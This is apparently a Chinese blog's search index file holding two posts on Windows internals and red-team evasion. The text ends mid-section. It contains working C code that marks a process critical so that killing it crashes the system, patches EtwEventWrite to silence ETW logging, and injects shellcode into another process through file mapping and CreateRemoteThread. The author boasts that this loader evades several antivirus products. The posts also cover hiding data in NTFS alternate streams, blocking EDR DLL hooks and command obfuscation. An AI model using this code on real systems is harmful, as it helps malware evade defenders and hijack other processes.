<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>《ProcessBreakOnTermination与ThreadBreakOnTermination》</title>
    <link href="/2025/10/08/%E3%80%8AProcessBreakOnTermination%E4%B8%8EThreadBreakOnTermination%E3%80%8B/"/>
    <url>/2025/10/08/%E3%80%8AProcessBreakOnTermination%E4%B8%8EThreadBreakOnTermination%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>我们都知道当我们结束掉系统的一个关键进程的时候，电脑会发生蓝屏，比如我们结束掉csrss.exe这个进程的时候。</p><p>那么到底是为什么呢？为什么有些关键进程挂了会蓝屏，有些进程挂了反而没事？其实都是因为该进程的一个标志位就是这个”ProcessBreakOnTermination “,通过这个标志这是一个关键进程。同时还有”ThreadBreakOnTermination” 这个标志位，标志这是一个关键线程</p><p>有些恶意软件也会利用到这两个标志，当我们把他杀了的时候系统就蓝屏了。很ex的一种操作</p><h1 id="相关的api和代码"><a href="#相关的api和代码" class="headerlink" title="相关的api和代码"></a>相关的api和代码</h1><p>要用的api其实就是这两个(未导出的api，同时需要有调试权限才能设置为关键进程)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">NTSTATUS NTAPI RtlSetThreadIsCritical(<span class="hljs-keyword">IN</span> <span class="hljs-type">BOOLEAN</span> NewValue,<span class="hljs-keyword">OUT</span> PBOOLEAN OldValue OPTIONAL,<span class="hljs-keyword">IN</span> <span class="hljs-type">BOOLEAN</span> NeedBreaks)<br>NTSTATUS NTAPI RtlSetProcessIsCritical (<span class="hljs-keyword">IN</span> <span class="hljs-type">BOOLEAN</span> NewValue,<span class="hljs-keyword">OUT</span> PBOOLEAN OldValue OPTIONAL,<span class="hljs-keyword">IN</span> <span class="hljs-type">BOOLEAN</span> NeedBreaks);<br></code></pre></td></tr></table></figure><p>演示代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">EnableDebugPrivilege</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TestCriticalApi</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(__cdecl *RTLSETPROCESSISCRITICAL)</span><span class="hljs-params">(IN BOOLEAN NewValue,OUT PBOOLEAN OldValue OPTIONAL,IN BOOLEAN NeedBreaks)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">TestCriticalApi</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">EnableDebugPrivilege</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE hToken = <span class="hljs-literal">NULL</span>;<br>    LUID debugPrivilegeValueLuid=&#123;<span class="hljs-number">0</span>&#125;;<br>    TOKEN_PRIVILEGES tokenPrivilege = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;debugPrivilegeValueLuid))<br>    &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    tokenPrivilege.PrivilegeCount = <span class="hljs-number">1</span>;<br>    tokenPrivilege.Privileges[<span class="hljs-number">0</span>].Luid = debugPrivilegeValueLuid;<br>    tokenPrivilege.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tokenPrivilege, <span class="hljs-built_in">sizeof</span>(tokenPrivilege), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>    &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hToken);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">TestCriticalApi</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">EnableDebugPrivilege</span>())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    HMODULE  hNtdllMod = <span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>));<br>    <span class="hljs-keyword">if</span>(!hNtdllMod)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    RTLSETPROCESSISCRITICAL RtlSetProcessIsCritical;<br>    RtlSetProcessIsCritical = (RTLSETPROCESSISCRITICAL)<span class="hljs-built_in">GetProcAddress</span>(hNtdllMod, <span class="hljs-string">&quot;RtlSetProcessIsCritical&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!RtlSetProcessIsCritical)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    NTSTATUS status = <span class="hljs-built_in">RtlSetProcessIsCritical</span>(TRUE, <span class="hljs-literal">NULL</span>, FALSE);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;status:%x\n&quot;</span>,status);<br><br>    <span class="hljs-built_in">getchar</span>();<br><br>    status = <span class="hljs-built_in">RtlSetProcessIsCritical</span>(FALSE, <span class="hljs-literal">NULL</span>, FALSE);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;status:%x\n&quot;</span>,status);<br>    <span class="hljs-built_in">getchar</span>();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>已经卡死了，在windag这能看见显示为critical process</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510082232049.png"></p><p>直接在windag上面看看标志</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510082242463.png" alt="image-20251008224219419"></p><p>标志为1，生效了的。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Windows操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《ETW绕过、Shellcode游击与NTFS备用数据流杂谈：高级规避技术漫谈》</title>
    <link href="/2025/10/07/%E3%80%8AETW%E7%BB%95%E8%BF%87%E3%80%81Shellcode%E6%B8%B8%E5%87%BB%E4%B8%8ENTFS%E5%A4%87%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E6%9D%82%E8%B0%88%EF%BC%9A%E9%AB%98%E7%BA%A7%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%E3%80%8B/"/>
    <url>/2025/10/07/%E3%80%8AETW%E7%BB%95%E8%BF%87%E3%80%81Shellcode%E6%B8%B8%E5%87%BB%E4%B8%8ENTFS%E5%A4%87%E7%94%A8%E6%95%B0%E6%8D%AE%E6%B5%81%E6%9D%82%E8%B0%88%EF%BC%9A%E9%AB%98%E7%BA%A7%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF%E6%BC%AB%E8%B0%88%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<p>这一期也是一个杂谈，我想把一些常用的技术，无论是红队实战的，还是免杀的一些技巧都写一下，因为还是不成体系没办法单独写成一个模块。所以写起来比较杂，兄弟们也不要嫌弃，该有的简单介绍和代码也是有的。</p><p>后续的计划是准备写二进制和翻译一些国外的文章，还有杂谈一些过去出现的一些有意思的新技术，比如doublue agent，这种2017年就出来的利用Windows 的机制实现被动dll注入的技术。当然现在面对杀软和EDR这些技术可能很难起效，但是技术的研究和内核依然值得我们学习。</p><p>大概后面的文章就分为这几类  windows机制(写一些操作系统机制)    二进制研究   国外文章翻译   免杀分享（有时间就写免杀，然后把加载器发出来）  高星项目分析(目前设想是分析土豆家族和impact 套件那些)</p><p>至于攻防实战，应急响应，等后面有有趣的项目案例再分享吧。好的废话不多说，我们进入今天的内容。</p><h1 id="ETW绕过"><a href="#ETW绕过" class="headerlink" title="ETW绕过"></a>ETW绕过</h1><h2 id="简单引入"><a href="#简单引入" class="headerlink" title="简单引入"></a>简单引入</h2><p>在红队测试工具 <a href="https://鳄鳄www.cobaltstrike.com鳄/">Cobalt Strike</a> 有个功能，叫做 <a href="https://www.cobaltstrike.com/aggressor-script/functions.html#bexecute_assembly">bexecute_assembly</a>，能够从内存中加载.NET程序集。这个功能不需要向硬盘写入文件，十分隐蔽，而且现有的Powershell利用脚本能够很容易的转换为C#代码，十分方便。简单来说就是它会在 Process 中执行 .NET Assemblies。原理是通过系统提供的API（ ICLRMetaHost<a href="https://www.21ct.cc/">、</a>ICLRRuntimeInfo、ICLRRuntimeHost） 达到将 CLR 载入的效果。</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071430753.png" alt="image-20251007143046649"></p><p>托管模块：Managed Module，一个标准的MS Window可移植执行体文件(32位PE32或64位PE32+)<br>        IL：Intermediate Language 中间语言，又叫托管代码(由CLR管理它的执行)<br>        元数据：metadata，一系列特殊的数据表<br>        程序集：Assembly，抽象的<br>        JIT：just-in-time 即时编译，将IL编译成本地CPU指令(本地代码)<br>        FCL：Framework Class Library，Framework 类库<br>        CTS：Common Type System，通用类型系统，描述了类型的定义及其行为方式<br>        CLI：Common Language Infrastructure，公共语言基础结构，这是MS提交给ECMA的一个标准，由CTS和其他Framwork组件构成  (CTS、CLS、 CR)<br>        CLS：Common Language Specfication，公共语言规范，详细规定了一个最小特性集</p><h2 id="CLR"><a href="#CLR" class="headerlink" title=".CLR"></a><strong>.CLR</strong></h2><p>全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。</p><p><a href="http://clr是.net/">CLR是.NET</a> Framework的主要执行引擎，来管理执行中的 .NET 程序：</p><p><strong>·</strong> 在CLR监视之下运行的程序属于”托管的”(managed)代码。</p><p><strong>·</strong> 不在CLR之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码</p><p>简单的说来这个技术是为了提高兼容性的，有点java中的jvm像虚拟机，CLR 引入了 <strong>CIL (Common Intermediate Language)<strong>，也叫 MSIL (Microsoft Intermediate Language)。无论你用 C#、VB.NET 还是 F# 编写代码，最终都会被编译成这种统一的中间语言。CLR 能够理解并执行 CIL，从而实现了</strong>语言的互操作性</strong>。这意味着不同 .NET 语言编写的组件可以无缝地相互调用。</p><p>就是你无论使用 C#还是VB.NET这些写代码，他不会直接编译成机器码，而是编译成一种中间语言，然后交给CLR这个平台进行翻译，等他翻译成机器码再交给cpu进行执行，这也就是我为什么说有点像java中的虚拟机了。</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071434643.png" alt="image-20251007143440598"></p><p>.NET Assemblies 是有办法被侦测到的，在 Process Explorer 中显示的 .NET Assemblies 就放着这个Process 所使用的 .NET Assemblies资源。</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071438966.png" alt="image-20251007143851918"></p><p>还或者是使用这个命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">logman</span> query providers &#123;E13C0D23-CCBC-<span class="hljs-number">4</span>E12-<span class="hljs-number">931</span>B-D9CC2EEE27E4&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071440329.png" alt="image-20251007144016274"></p><p>而CRL的一切动静也是会被ETW识别到，我们也很简单的就能绕过,因为核心就是EtwEventWrite这个api，程序启动后就会调用EtwEventWrite这个api向ETW中写入事件，我们只需要hook一下，将第一个写入的数据改成0xc3返回指令，就会终止这个写入了</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><span class="hljs-type">int</span> main() &#123;<br>STARTUPINFOA si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br><br><span class="hljs-comment">// 1. 建立一个 Powershell Process，并取得 Process Handle</span><br>CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;powershell -noexit&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br><span class="hljs-comment">// 2. 从 ntdll.dll 中取得 EtwEventWrite 的地址</span><br>HMODULE hNtdll = GetModuleHandleA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>LPVOID pEtwEventWrite = GetProcAddress(hNtdll, <span class="hljs-string">&quot;EtwEventWrite&quot;</span>);<br><br><span class="hljs-comment">// 3. 把 EtwEventWrite 的地址的权限改成可读、可写、可执行(rwx)</span><br>DWORD oldProtect;<br>VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="hljs-number">1</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><br><span class="hljs-comment">// 4. 将 EtwEventWrite 的第一个 byte 改成 0xc3，也就是ret返回指令</span><br><span class="hljs-type">char</span> patch = <span class="hljs-number">0xc3</span>;<br>WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &amp;patch, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// 5. 把 EtwEventWrite 的权限改回，并且继续执行 Process</span><br>VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, <span class="hljs-number">1</span>, oldProtect, <span class="hljs-literal">NULL</span>);<br>ResumeThread(pi.hThread);<br><br>CloseHandle(pi.hProcess);<br>CloseHandle(pi.hThread);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071445049.png"></p><h1 id="映射注入"><a href="#映射注入" class="headerlink" title="映射注入"></a>映射注入</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>映射注入是一种内存注入技术，可以避免使用一些经典注入技术使用的API,如VirtualAllocEx,WriteProcessMemory等被杀毒软件严密监控的API，同时创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典写入函数，增加了隐蔽性。</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071448241.png"></p><p>基本原理其实就是利用的Windows映射内存的那几个api，我之前测试过免杀性很好，我对编译器基本没有做什么出来，shellcode也只用了sgn加密，写出来加载器，直接过360 火绒和defender 。微步0查杀，vt 6&#x2F;55 当然肯定还是没过哨兵一号</p><h2 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h2><ol><li>在注入进程创建mapping</li><li>将mapping映射到注入进程虚拟地址</li><li>往被映射的虚拟地址写入shellcode</li><li>打开被注入进程句柄</li><li>将mapping映射到被注入进程虚拟地址</li><li>创建远程线程</li></ol><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment (lib, <span class="hljs-string">&quot;OneCore.lib&quot;</span>)</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-type">int</span> main(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)<br>&#123;<br><br><br><span class="hljs-comment">//创建文件映射内核对象</span><br>HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">//文件映射对象映射到当前应用程序的地址空间</span><br>LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>memcpy((PVOID)lpMapAddress, shellcode, <span class="hljs-keyword">sizeof</span>(shellcode));<br><br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-literal">FALSE</span>, atoi(argv[<span class="hljs-number">1</span>]));<br><br><span class="hljs-comment">//映射到指定进程的地址空间</span><br>LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, PAGE_EXECUTE_READ);<br><br>HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>UnmapViewOfFile(lpMapAddress);<br>CloseHandle(hMapping);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071530830.png" alt="image-20251007153007724"></p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071534166.png" alt="image-20251007153414050"></p><p>这个api比较新，在win10之后才有的。</p><h1 id="NTFS备用数据流"><a href="#NTFS备用数据流" class="headerlink" title="NTFS备用数据流"></a>NTFS备用数据流</h1><p>这个就比较熟悉了，在web安全里面，有NTFS流绕过文件上传的手法</p><h2 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>1993年微软推出了基于流行的NT平台的Windows NT操作系统。之后，NTFS作为WIndows开发基于NT的操作系统时的首选文件系统，逐步取代被应用于旧版Windows操作系统（比如Windows 9x）的文件系统，即FAT（File Access Table）。</p><p>  NTFS中的备用数据流（Alternate Data Stream，ADS）允许将一些元数据嵌入文件或是目录，而不需要修改其原始功能或内容。</p><p>  在NTFS中，主数据流指的是文件或目录的标准内容，通常对用户可见，而备用数据流（ADS）则隐藏。如果要查看备用数据流，可以使用<code>dir</code>命令的<code>/R</code>选项，或是Windows提供的<code>streams.exe</code>工具，没有可用的API。</p><p>简单来说就是在 NTFS 中，文件具有属性。其中一个属性是“数据”属性。数据属性通常包含文件的内容。例如，如果你有一个文本文件，数据属性将包含该文件的内容。通常不为人所知的是，此属性分为两部分。第一部分是所谓的主数据流，它包含文件的内容。第二部分通常称为备用流。像主数据流一样，备用流可以包含数据。</p><p>ADS没有大小限制且多个数据流可以和一个正常文件关联。ADS的内容也不仅限于text文本数据，基本上只要是二进制格式文件都可以被作为ADS备用流嵌入。所以我们可以将 base64 编码二进制文件存储在 NTFS 备用流中，然后执行它。还可以修改与备用流关联的文件的创建和修改日期，使其更难以被检测到。</p><h3 id="已知的一个正常用途"><a href="#已知的一个正常用途" class="headerlink" title="已知的一个正常用途"></a>已知的一个正常用途</h3><p>在windows上，从网上下载的文件，都会有一个备用数据流，名为：<filename>:Zone.Identifier<br>该备用数据流会记录下载地址，这个功能也被系统用于判断文件是否从网络下载</p><p>假如下载的文件是 hello.txt，则备用数据流名称为：hello.txt:Zone.Identifier<br>意思就是说，假如我发现hello.txt:Zone.Identifier存在，那同一文件夹下的hello.txt就是从网上下载的</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-built_in">Item</span> <span class="hljs-variable">c</span><span class="hljs-operator">:</span>\<span class="hljs-variable">temp</span> <span class="hljs-operator">-</span><span class="hljs-variable">Stream</span> <span class="hljs-operator">*</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">Content</span> <span class="hljs-variable">tempt</span> <span class="hljs-operator">-</span><span class="hljs-variable">Stream</span> <span class="hljs-variable">evil</span><br></code></pre></td></tr></table></figure><p>具体利用可以看这</p><p><a href="https://zhuanlan.zhihu.com/p/654643812">Windows之 NTFS 交换数据流 实现隐藏文件 - 知乎</a></p><h1 id="利用系统策略防止dll注入"><a href="#利用系统策略防止dll注入" class="headerlink" title="利用系统策略防止dll注入"></a>利用系统策略防止dll注入</h1><h2 id="简单介绍-2"><a href="#简单介绍-2" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>可以通过 Windows 阻止非 Microsoft 签名的二进制文件注入该进程的方式启动新进程。这对于规避一些通过将 DLL 注入正在运行的进程来执行用户级挂钩的 AV&#x2F;EDR很有用。</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-type">int</span> main()<br>&#123;<br>PROCESS_INFORMATION pi = &#123;&#125;;<br>STARTUPINFOEXA si = &#123;&#125;;<br>SIZE_T attributeSize = <span class="hljs-number">0</span>;<br><br>InitializeProcThreadAttributeList(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);<br>PPROC_THREAD_ATTRIBUTE_LIST attributes = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attributeSize);<br>InitializeProcThreadAttributeList(attributes, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, &amp;attributeSize);<br><br>DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;<br>UpdateProcThreadAttribute(attributes, <span class="hljs-number">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &amp;policy, <span class="hljs-keyword">sizeof</span>(DWORD64), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>si.lpAttributeList = attributes;<br><br>CreateProcessA(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">&quot;notepad&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">TRUE</span>, EXTENDED_STARTUPINFO_PRESENT, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);<br>HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, attributes);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>重要的其实就是这两句，大家把这几句加到自己程序里面就可以了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY <span class="hljs-built_in">sp</span> = &#123;&#125;;<br><span class="hljs-built_in">sp</span>.MicrosoftSignedOnly = <span class="hljs-number">1</span>;<br>SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;<span class="hljs-built_in">sp</span>, sizeof(<span class="hljs-built_in">sp</span>));<br></code></pre></td></tr></table></figure><p>其实就是Windows的一个策略，将程序标志设置成ProcessSignaturePolicy这个，就只能运行带有微软签名的dll加载。大概可以和之前的dll空心化打一个配合？</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071604471.png" alt="image-20251007160442380"></p><h1 id="命令行混淆"><a href="#命令行混淆" class="headerlink" title="命令行混淆"></a>命令行混淆</h1><h2 id="简单介绍-3"><a href="#简单介绍-3" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>对于红队来说，会希望蓝队分析的成本提高，让自己的指令或代码比较不容易被理解或是侦测。假设蓝队要辨别现在要执行的指令是不是恶意的，可能会透过指令的一些特征确认，那红队就可以利用混淆的方式绕过那些特征。</p><p>红队在成功入侵一台机器后，会尽量使自己做的事情不容易被蓝队发现。所以攻击者可以把指令混淆，让蓝队无法轻易知道攻击者目前做了哪些坏事。如此一来，攻击者的入侵程度可能就会被错估，导致损失持续扩大。</p><p>混淆的目标可以是 Cmd 指令、Powershell 指令、Python、Javascript、C#、C&#x2F;C++ 代码等等</p><h2 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h2><h3 id="静态检测"><a href="#静态检测" class="headerlink" 